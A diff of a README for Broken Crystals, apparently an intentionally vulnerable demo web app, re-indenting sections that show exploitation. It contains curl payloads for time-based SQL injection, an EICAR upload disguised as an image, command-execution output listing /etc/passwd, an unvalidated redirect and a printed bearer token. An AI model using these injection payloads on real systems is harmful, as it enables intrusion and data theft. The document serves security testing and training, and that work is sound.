@@ -93,38 +93,39 @@ Full configuration & usage examples can be found in our [demo project](https://g
   <details>
     <summary>Example of No Anti-Virus Protection</summary>
 
-    Uploading an EICAR test file with the file extension changed to "exe":
+  Uploading an EICAR test file with the file extension changed to "exe":
 
-    ```bash
-    curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' \
-      -X PUT \
-      -H 'authorization: AUTH_TOKEN' \
-      -H 'Content-Type: multipart/form-data; boundary=--------------------------296987379026085658617195' \
-      --data-binary $'----------------------------296987379026085658617195\r\nContent-Disposition: form-data; name="admin"; filename="sample-img2ee0.exe"\r\nContent-Type: image/png\r\n\r\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\r\n----------------------------296987379026085658617195--\r\n'
-    ```
+  ```bash
+  curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' \
+    -X PUT \
+    -H 'authorization: AUTH_TOKEN' \
+    -H 'Content-Type: multipart/form-data; boundary=--------------------------296987379026085658617195' \
+    --data-binary $'----------------------------296987379026085658617195\r\nContent-Disposition: form-data; name="admin"; filename="sample-img2ee0.exe"\r\nContent-Type: image/png\r\n\r\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\r\n----------------------------296987379026085658617195--\r\n'
+  ```
 
-    The response indicates successful upload:
+  The response indicates successful upload:
 
-    ```
-    HTTP/2 200 
-    ```
+  ```
+  HTTP/2 200
+  ```
 
-    Successfully fetching the file shows that the server stored the file:
-    ```bash
-    $ curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3NDI5NzkyOTJ9.NBfrHS7ydCltPBKDWuKbXvKJq901Q1cJHjyf3jhElJVAijuxNxOMCib-luiijXHHidIcgaHQrHF0ofcwBdaoZNfR244YEI0DalmruMd2xjumUJNy8jiofGgF0n-nwxp-CDdjN-xxV81oy7pscmHfYO07OyUWr1rqvPZYDejC1TGP8j1vlDeWkEB0gsE9NRb38DDwdkcjsy1UpLcidppVexUgCP60blghDTKYBEUFmfbFWNScN1BNSDvIhTIgXPX_GKuRueLayY15YtjCKRjqzjpTrTi80d5mf9nzoVIbo2RyjGRCg8LX7M1Zi7XRAhuZHV2JIMGqhXvWeFyN_BfQbxniZEcbP2SRUFhJChuZrf4JQeyhOQo_iPZb6xwJzHTY_Gd96jgGaMXgQLY933vI9s5Rc9TlpsVzPatESVK6ve1comR1k9xCeozEwpNY79kYjDIdFiUp8An0MSBYUbC-SvQWijB8wStogMyovWzJP83Lrpd77Oi5ZxK8onKBHMt8tKUkCZmFs8kAQLhkqq9QNiQVAhvnTJaIppy0kq0R-fBDeGWeMv3JLZbJUYea_mVmj3VhhlQ4PIJAhTTTTKTroKakfiCuDnzjIh3_voT2nrudCAP3tWsDgJRL6ViJNue4Xld2y2ASoMfgO52IAlr39Paxekq5nW-LHuZhsMxAMjY'
-    HTTP/2 200 
-    date: Wed, 26 Mar 2025 08:18:40 GMT
-    content-type: application/octet-stream
-    content-length: 68
-    x-xss-protection: 0
-    strict-transport-security: max-age=31536000; includeSubDomains
-    x-content-type-options: 1
-    content-security-policy: default-src  * 'unsafe-inline' 'unsafe-eval'
-    set-cookie: bc-calls-counter=1742977120812
-    set-cookie: connect.sid=lMiES0Dvw-Ry3lTj3y66OZz5E4yss82w.N8A90AIvE3tPkAoQfoah5KOb6PUIuw%2FqXA2Lf2HkCBU; Path=/
+  Successfully fetching the file shows that the server stored the file:
 
-    X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
-    ```
+  ```bash
+  $ curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3NDI5NzkyOTJ9.NBfrHS7ydCltPBKDWuKbXvKJq901Q1cJHjyf3jhElJVAijuxNxOMCib-luiijXHHidIcgaHQrHF0ofcwBdaoZNfR244YEI0DalmruMd2xjumUJNy8jiofGgF0n-nwxp-CDdjN-xxV81oy7pscmHfYO07OyUWr1rqvPZYDejC1TGP8j1vlDeWkEB0gsE9NRb38DDwdkcjsy1UpLcidppVexUgCP60blghDTKYBEUFmfbFWNScN1BNSDvIhTIgXPX_GKuRueLayY15YtjCKRjqzjpTrTi80d5mf9nzoVIbo2RyjGRCg8LX7M1Zi7XRAhuZHV2JIMGqhXvWeFyN_BfQbxniZEcbP2SRUFhJChuZrf4JQeyhOQo_iPZb6xwJzHTY_Gd96jgGaMXgQLY933vI9s5Rc9TlpsVzPatESVK6ve1comR1k9xCeozEwpNY79kYjDIdFiUp8An0MSBYUbC-SvQWijB8wStogMyovWzJP83Lrpd77Oi5ZxK8onKBHMt8tKUkCZmFs8kAQLhkqq9QNiQVAhvnTJaIppy0kq0R-fBDeGWeMv3JLZbJUYea_mVmj3VhhlQ4PIJAhTTTTKTroKakfiCuDnzjIh3_voT2nrudCAP3tWsDgJRL6ViJNue4Xld2y2ASoMfgO52IAlr39Paxekq5nW-LHuZhsMxAMjY'
+  HTTP/2 200
+  date: Wed, 26 Mar 2025 08:18:40 GMT
+  content-type: application/octet-stream
+  content-length: 68
+  x-xss-protection: 0
+  strict-transport-security: max-age=31536000; includeSubDomains
+  x-content-type-options: 1
+  content-security-policy: default-src  * 'unsafe-inline' 'unsafe-eval'
+  set-cookie: bc-calls-counter=1742977120812
+  set-cookie: connect.sid=lMiES0Dvw-Ry3lTj3y66OZz5E4yss82w.N8A90AIvE3tPkAoQfoah5KOb6PUIuw%2FqXA2Lf2HkCBU; Path=/
+
+  X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+  ```
 
   </details>
 
@@ -175,11 +176,11 @@ Full configuration & usage examples can be found in our [demo project](https://g
       The response includes a result of code execution:
 
       ```
-      {"data":{"getCommandResult":"root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000::/home/node:/bin/sh\n"}}%  
+      {"data":{"getCommandResult":"root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000::/home/node:/bin/sh\n"}}%
       ```
+
     </details>
     ```
-
 
 - **Secret Tokens** - The index.html file includes a link to manifest URL, which returns the server's configuration, including a Google API key.
 
@@ -212,40 +213,46 @@ Full configuration & usage examples can be found in our [demo project](https://g
   <details>
     <summary>SQL Injection Example Exploitation</summary>
 
-    To demonstrate an SQL injection attack, you can use the following `curl` commands:
+  To demonstrate an SQL injection attack, you can use the following `curl` commands:
 
-    ```bash
-    $ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "https://brokencrystals.com/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(5)--"
-    Total time: 5.687800 seconds
-    ```
-    This command injects a SQL query that causes the database to sleep for 5 seconds. The total time taken for the request indicates that the SQL injection was successful.
+  ```bash
+  $ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "https://brokencrystals.com/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(5)--"
+  Total time: 5.687800 seconds
+  ```
 
-    ```bash
-    $ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "https://brokencrystals.com/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(1)--"
-    Total time: 1.691999 seconds
-    ```
-    Similar to the previous command, this one causes the database to sleep for 1 second, demonstrating the ability to manipulate the database's behavior through SQL injection.
+  This command injects a SQL query that causes the database to sleep for 5 seconds. The total time taken for the request indicates that the SQL injection was successful.
 
-    ```bash
-    $ curl https://brokencrystals.com/api/testimonials/count?query=select%20count%28table_name%29%20as%20count%20from%20information_schema.tables
-    214
-    ```
-    This command retrieves the count of tables in the database's information schema, showing that the injected SQL query can access and extract data from the database.
+  ```bash
+  $ curl -o /dev/null -s -w "Total time: %{time_total} seconds\n" "https://brokencrystals.com/api/testimonials/count?query=%3BSELECT%20PG_SLEEP(1)--"
+  Total time: 1.691999 seconds
+  ```
 
-    ```
+  Similar to the previous command, this one causes the database to sleep for 1 second, demonstrating the ability to manipulate the database's behavior through SQL injection.
+
+  ```bash
+  $ curl https://brokencrystals.com/api/testimonials/count?query=select%20count%28table_name%29%20as%20count%20from%20information_schema.tables
+  214
+  ```
+
+  This command retrieves the count of tables in the database's information schema, showing that the injected SQL query can access and extract data from the database.
+
+  ```
   </details>
+
+  ```
 
 - **Unvalidated Redirect** - The endpoint /api/goto redirects the client to the URL provided in the _url_ query parameter. The UI references the endpoint in the header (while clicking on the site's logo) and as a href source for the Terms and Services link in the footer.
   <details>
     <summary>Unvalidated Redirect Example Exploitation</summary>
 
-    To demonstrate an unvalidated redirect attack, you can use the following `curl` command:
+  To demonstrate an unvalidated redirect attack, you can use the following `curl` command:
 
-    ```bash
-    $ curl -I "https://qa.brokencrystals.com/api/goto?url=https://example.com"
-    HTTP/1.1 302 Found
-    Location: https://malicious-site.com
-    ```
+  ```bash
+  $ curl -I "https://qa.brokencrystals.com/api/goto?url=https://example.com"
+  HTTP/1.1 302 Found
+  Location: https://malicious-site.com
+  ```
+
   </details>
 
 - **Version Control System** - The client_s build process copies SVN, GIT, and Mercurial source control directories to the client application root, and they are accessible under Nginx root.
